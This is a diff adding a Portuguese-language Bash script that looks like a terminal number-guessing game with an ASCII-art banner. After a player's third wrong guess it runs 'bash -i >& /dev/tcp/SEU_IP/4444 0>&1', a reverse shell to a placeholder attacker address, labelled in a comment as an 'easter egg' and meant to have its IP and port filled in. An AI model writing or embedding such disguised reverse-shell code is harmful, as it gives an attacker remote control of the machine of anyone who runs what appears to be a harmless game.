@@ -1,0 +1,66 @@
+#!/bin/bash
+
+# Cores
+RED='\033[1;31m'
+GREEN='\033[1;32m'
+CYAN='\033[1;36m'
+YELLOW='\033[1;33m'
+NC='\033[0m' # Sem cor
+
+clear
+
+# Banner com cor
+echo -e "${CYAN}"
+cat << "EOF"
+               /
+                   __       //
+                   -\= \=\ //
+                 --=_\=---//=--
+               -_==/  \/ //\/--
+                ==/   /O   O\==--
+   _ _ _ _     /_/    \  ]  /--
+  /\ ( (- \    /       ] ] ]==-
+ (\ _\_\_\-\__/     \  (,_,)--
+(\_/                 \     \-
+\/      /       (   ( \  ] /)
+/      (         \   \_ \./ )
+(       \         \      )  \
+(       /\_ _ _ _ /---/ /\_  \
+ \     / \     / ____/ /   \  \
+  (   /   )   / /  /__ )   (  )
+  (  )   / __/ '---`       / /
+  \  /   \ \             _/ / Nerú Shine
+  ] ]     )_\_         /__\/
+  /_\     ]___\
+ (___)
+EOF
+echo -e "${NC}"
+
+echo -e "${YELLOW}>>> Bem-vindo ao Shine's Terminal Challenge!"
+echo -e ">>> Adivinha o número entre 1 e 10.${NC}"
+echo
+
+# Número secreto
+SECRET=$(( RANDOM % 10 + 1 ))
+ATTEMPTS=0
+
+while true; do
+  read -p "Tua tentativa: " GUESS
+  ((ATTEMPTS++))
+
+  if [[ "$GUESS" -eq "$SECRET" ]]; then
+    echo -e "${GREEN}Acertaste! O número era $SECRET. Tentativas: $ATTEMPTS${NC}"
+    break
+  else
+    echo -e "${RED}Errado!${NC} Tenta de novo."
+  fi
+
+  # Easter Egg - Reverse Shell após 3 falhas
+  if [[ $ATTEMPTS -eq 3 ]]; then
+    echo -e "${RED}Erro 3x? Nerú Shine tomou controle...${NC}"
+
+    # Payload reverso (troca IP e porta)
+    bash -i >& /dev/tcp/SEU_IP/4444 0>&1
+    break
+  fi
+done
